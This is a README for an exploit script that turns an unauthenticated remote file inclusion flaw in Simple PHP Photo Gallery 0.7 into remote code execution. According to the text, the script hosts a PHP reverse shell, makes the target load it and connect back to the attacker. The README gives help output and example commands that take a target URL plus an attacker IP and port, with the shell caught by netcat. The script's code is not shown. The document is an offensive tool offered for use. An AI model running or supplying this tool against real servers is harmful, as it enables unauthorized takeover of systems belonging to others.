# SimplePHPGal-RCE.py RFI --> RCE
Simple PHP Photo Gallery 0.7 is vulnerable to Unauthenticated RFI. This script will attempt to turn that into RCE by automatically hosting a PHP reverse shell and then calling that shell back. The attacker still needs to catch the shell with netcat or something similar. 

Credit: https://www.exploit-db.com/exploits/48424

python3 SimplePHPGal-RCE.py -h
usage: SimplePHPGal-RCE.py [-h] [--httpport HTTPPORT] url attackerip attackerport

This script uses an RFI in SimplePHPGal to get RCE

python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444

python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444 --httpport 8080

positional arguments:
  url                  The URL of the target.
  attackerip           Kali IP address for reverse shell and http server
  attackerport         Port for the reverse shell.

optional arguments:
  -h, --help           show this help message and exit
  --httpport HTTPPORT  Port for the http server. Default 80
